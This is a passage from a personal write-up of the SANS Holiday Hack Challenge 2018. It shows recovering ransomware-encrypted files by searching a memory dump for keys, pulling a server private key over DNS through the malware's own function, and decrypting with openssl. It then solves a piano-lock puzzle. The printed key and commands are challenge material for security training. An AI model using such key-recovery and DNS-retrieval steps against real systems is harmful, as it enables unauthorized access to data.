PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; echo $Pub_key_encrypted_Key

be0d0a74f42f7a568dcc42564a7b0a6c4da572afa723dccbcee8019aedbbadc586ae
5411a85d41a5414d8bc0ae48b0b6ae1fcb17f92a5dbeb60c82f2e02a087ccaee0eb3
db5bd58a5f5d992f10f3364196326bb03639dbec2c24d346e86aee452508c5757c6a
a2f6721ebe11a52758afd0fb268e38597c9ec17b47e615d063665455bd0663a7bcf4
129174ab7d58da87861419445acbb30e6153e221e3f75d3678d16bc1f361d5b5612e
8e44a7bd1bafee35f87e1ba2c56d8dc47233092c59abb31f239be305a2099bca8ed1
73535c7f970b044179173ff0df527f999d779928d2ad4811334c6f2a4e24cd84c16b
53b95f06f959ae8a929811481dacffb690a9
</code></pre>

<p>This information gives us two two things to look for within the memory dump:
-   A 32-character hex string for the AES key
-   A 512-character hex string for the public key encrypted AES key</p>
<p>To accomplish this, we load the memory dump into "power_dump.py" to search for hex strings of 32-characters and 512-characters.</p>
<pre><code>================ Filters ================
1| LENGTH  len(variable_values) == 32
2| MATCHES  bool(re.search(r&quot;^[a-fA-F0-9]*$&quot;,variable_values))

[i] 5 powershell Variable Values found!

[...snip...]

: print all
033ecb2bc07a4d43b5ef94ed5a35d280
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
cf522b78d86c486691226b40aa69e95c
Variable Values #2 above ^
Type any key to go back and just Enter to Continue...
9e210fe47d09416682b841769c78b8a3
Variable Values #3 above ^
Type any key to go back and just Enter to Continue...
4ec4f0187cb04f4cb6973460dfe252df
Variable Values #4 above ^
Type any key to go back and just Enter to Continue...
27c87ef9bbda4f709f6b4002fa4af63c
Variable Values #5 above ^
Type any key to go back and just Enter to Continue...
</code></pre>

<pre><code>================ Filters ================
1| MATCHES  bool(re.search(r&quot;^[a-fA-F0-9]*$&quot;,variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!

[...snip...]

: print all
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a18
49d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d81
1e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c58611
39c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83
218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407
d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b66
8109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc4999521
7d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a771525639
06a2c29c6d12f971
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
</code></pre>

<p>Although we found several candidates for encryption keys, none of them allow us to decrypt Alabaster's elfdb file. The only remaining option right now is to somehow decrypt the encrypted key by retrieving the server's private key.</p>
<p>Similar to what we did to grab the deobfuscated version of the malware, we import the <code>get_over_dns()</code> function to our <em>PowerShell</em> terminal and attempt to download <code>server.key</code> (<code>7365727665722e6b6579</code>), instead of <code>server.crt</code> (<code>7365727665722E637274</code>). Hopefully, we can retrieve the server's private key in case the attacker inadvertently left it available for public download. Upon attempting this, we find that we successfully retrieve the server's private key.</p>
<pre><code>PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; get_over_dns(&quot;7365727665722e6b6579&quot;);
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
</code></pre>

<p>First, we should confirm that this is the correct private key by matching its modulus with the public key's.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl x509 -modulus -noout -in server.crt | openssl md5; openssl rsa -modulus -noout -in server.key | openssl md5

(stdin)= f5d6eee25830f8877e20fe4bf5a1d9ad
(stdin)= f5d6eee25830f8877e20fe4bf5a1d9ad
</code></pre>

<p>Now that we've confirmed that we have the corresponding private key, we can decrypt the encrypted AES key and use it to recover Alabaster's elfdb file.</p>
<p>First, we translate the potential key from a hex string to binary data.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ echo -ne 
&quot;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4
a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672
d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d
2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf01978995
0d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029c
a4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c
75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268
af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d
7d47681a77152563906a2c29c6d12f971&quot; | xxd -r -p &gt; encrypted_key.key
</code></pre>

<p>Then, using openssl with PKCS#1 OAEP, we decrypt the encrypted key using the server's private key and convert it back to a hex string.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl rsautl -decrypt -oaep -in encrypted_key.key -out encryption_key.key -inkey server.key
bernard@Bernard-PC:~/NetsecStudy/sans2018$ xxd -p encryption_key.key
fbcfc121915d99cc20a3d3d5d84f8308
</code></pre>

<p>Finally, by using the malware's own file decryption function, we can use the decoded AES encryption key to recover alabaster's passwords. This saves us from having to determine the file's IV and other various parameters to decrypt it on our own.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $decKey = &quot;fbcfc121915d99cc20a3d3d5d84f8308&quot;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $file = &quot;alabaster_passwords.elfdb.wannacookie&quot;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; Enc_Dec-File $(H2B $decKey) $file $false
</code></pre>

<p>Now that we've decrypted the passwords file, we learn that it is a SQLite database. Finally, we can simply open the file in a SQLite Database Browser to discover the password Alabaster needs: <strong><em>ED#ED#EED#EF#G#F#G#ABA#BA#B</em></strong></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
</code></pre>

<p><img alt="Searching the Database" src="../challenges/9d-dbbrowser.png" /></p>
<h3 id="10-who-is-behind-it-all">10) Who Is Behind It All?<a class="headerlink" href="#10-who-is-behind-it-all" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Who was the mastermind behind the whole KringleCon plan? And, in your <a href="mailto:SANSHolidayHackChallenge@counterhack.com">emailed answers</a> please explain that plan.</p>
<p>I'm seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password?</p>
</blockquote>
<p>We can access the <em>Piano Lock</em> on the right wall of Santa's Secret Room or through the independant website: https://pianolockn.kringlecastle.com/</p>
<p><img alt="Location" src="../challenges/10-location.png" /></p>
<p><img alt="Piano Lock" src="../challenges/10-lock.png" /></p>
<p>We first try directly playing the notes from Alabaster's password database, but the lock tells us that the key is incorrect.</p>
<p><img alt="Wrong Key" src="../challenges/10-outoftune.png" /></p>
<p>After reading a hint in the badge menu we learn that we must transpose the password into the key of D, from the key of E. </p>
<blockquote>
<p><strong>Rachmaninoff</strong></p>
<p>From: Alabaster Snowball
Really, it's Mozart. And it should be in the key of D, not E.</p>
</blockquote>
<p>This is simply one whole-step down, or one letter. Playing the tune like this gives us the correct key and unlocks the vault.</p>
<p><img alt="Correct Key" src="../challenges/10-correct.png" /></p>
<p>We can also check a tune by sending a GET request to https://pianolockn.kringlecastle.com/checkpass.php, with two GET parameters. <code>i</code> is the notes played and <code>resourceID</code> is <code>undefined</code>.</p>
<p>This reveals to us that the entire incident was planned out by <strong><em>Santa</em></strong>, who is looking to find new cybersecurity specialists for his operation next year.</p>
<p><img alt="Inside the Vault" src="../challenges/10-insidevault.png" /></p>
<blockquote>
<p>You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!</p>
<p>You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!
You see, I finally found you!</p>
<p>I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.</p>
<p>That’s why we had so many different challenges this year.
We needed to find someone with skills all across the spectrum.</p>
<p>I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.</p>
<p>And you did!</p>
<p>Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.
See what happens when they take off those hats?</p>
<p>Based on your victory… next year, I’m going to ask for your help in defending my whole operation from evil bad guys.</p>
<p>And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.</p>
<p>You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?</p>
<p>They lived happily ever after.</p>
<p>- Santa</p>
</blockquote>
<p>Now we've finally completed the <strong><em>SANS Holiday Hack Challenge 2018</em></strong>!</p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href=".." title="Home" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Home
              </span>
            </div>
          </a>
        
        
          <a href="../terminals/" title="Terminal Exercises" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Terminal Exercises
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
  <div class="md-footer-social">
    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/bernardsmith0892/" class="md-footer-social__link fa fa-github"></a>
    
      <a href="https://twitter.com/BernardSmith892" class="md-footer-social__link fa fa-twitter"></a>
    
      <a href="https://www.linkedin.com/in/bernard-smith-27324257/" class="md-footer-social__link fa fa-linkedin"></a>
    
  </div>

      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.b41f3d20.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
    
      
    
  </body>
</html>